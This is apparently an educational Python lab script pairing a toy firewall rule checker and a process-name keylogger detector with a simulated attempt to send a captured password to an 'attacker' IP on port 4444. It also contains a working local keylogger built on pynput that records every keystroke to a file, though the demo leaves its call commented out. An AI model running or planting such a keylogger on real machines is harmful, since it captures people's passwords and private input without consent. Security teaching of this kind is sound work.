# ===============================
# Keylogger + Firewall Simulator
# ===============================
# Educational use only!

from pynput import keyboard
import psutil
import logging

# --------------------------
# Firewall Rule Definitions
# --------------------------
firewall_rules = [
    {"src": "192.168.1.10", "dst": "8.8.8.8", "port": 53, "action": "ALLOW"},    # DNS
    {"src": "192.168.1.10", "dst": "0.0.0.0/0", "port": 80, "action": "ALLOW"},  # HTTP
    {"src": "192.168.1.10", "dst": "0.0.0.0/0", "port": 443, "action": "ALLOW"}, # HTTPS
    {"src": "192.168.1.10", "dst": "123.45.67.89", "port": 4444, "action": "DENY"}, # Block attacker
]

# --------------------------
# Firewall Simulator
# --------------------------
def check_traffic(src, dst, port):
    """Check traffic against firewall rules."""
    for rule in firewall_rules:
        if rule["src"] == src and rule["port"] == port:
            if rule["dst"] == dst or rule["dst"] == "0.0.0.0/0":
                return rule["action"]
    return "DENY (default rule)"

# --------------------------
# Simulated Keylogger
# --------------------------
def keylogger_attempt():
    captured = "user_password123"
    dst_ip = "123.45.67.89"  # Attacker IP
    port = 4444
    print(f"\n🔴 Keylogger trying to send '{captured}' to {dst_ip}:{port}")
    return ("192.168.1.10", dst_ip, port)

# --------------------------
# Defensive Monitor
# --------------------------
def monitor():
    src, dst, port = keylogger_attempt()
    action = check_traffic(src, dst, port)
    if "DENY" in action:
        print(f"🛑 Firewall blocked traffic to {dst}:{port}")
    else:
        print(f"✅ Traffic allowed to {dst}:{port}")

# --------------------------
# Simple Keylogger (local)
# --------------------------
def run_keylogger():
    log_file = "keylog.txt"
    logging.basicConfig(filename=log_file, level=logging.DEBUG, format="%(asctime)s: %(message)s")

    def on_press(key):
        try:
            logging.info(f"Key pressed: {key.char}")
        except AttributeError:
            logging.info(f"Special key pressed: {key}")

    print("\n⌨️ Keylogger is running... (Press ESC to stop)")
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

# --------------------------
# Detection of Keyloggers
# --------------------------
def detect_keyloggers():
    suspicious = []
    for proc in psutil.process_iter(['pid', 'name']):
        try:
            if "keylog" in proc.info['name'].lower():
                suspicious.append(proc.info)
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            pass
    return suspicious

# --------------------------
# Demo Run
# --------------------------
if __name__ == "__main__":
    print("Cybersecurity Lab: Keylogger + Firewall Demo")

    # Normal traffic tests
    print("\n--- Normal Traffic ---")
    print(check_traffic("192.168.1.10", "8.8.8.8", 53))   # DNS allowed
    print(check_traffic("192.168.1.10", "1.1.1.1", 443))  # HTTPS allowed

    # Suspicious traffic attempt
    print("\n--- Suspicious Traffic ---")
    monitor()

    # Detect if keylogger processes exist
    print("\n--- Detecting Keyloggers ---")
    found = detect_keyloggers()
    if found:
        print("Potential keylogger detected:", found)
    else:
        print("No keylogger processes detected")

    # Run local keylogger simulation (Press ESC to stop)
    # Uncomment next line if you want to test
    # run_keylogger()
